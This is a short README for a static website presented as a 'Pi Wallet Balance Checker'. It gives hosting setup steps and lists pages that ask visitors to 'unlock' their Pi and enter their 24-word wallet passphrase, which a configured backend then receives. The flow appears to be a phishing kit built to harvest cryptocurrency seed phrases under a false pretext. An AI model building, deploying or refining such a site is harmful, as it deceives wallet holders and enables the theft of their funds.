# Pi Wallet Balance Checker - Frontend

Static frontend for Pi wallet balance checker.

## Setup

1. Open `js/config.js` and replace `API_URL` with your deployed backend URL (e.g., `https://your-backend.up.railway.app/api/check-balances`).
2. Deploy this folder to Netlify, Vercel, or any static hosting service.
3. Ensure your backend's `ALLOWED_ORIGIN` includes your frontend domain (e.g., `https://your-frontend.netlify.app`).

## Pages

- `index.html` – Landing page with "Unlock your Pi" button.
- `unlock.html` – Enter 24-word passphrase.
- `feedback.html` – Shows success message with locked balance.
- `find-passphrase.html` – Instructions to locate passphrase.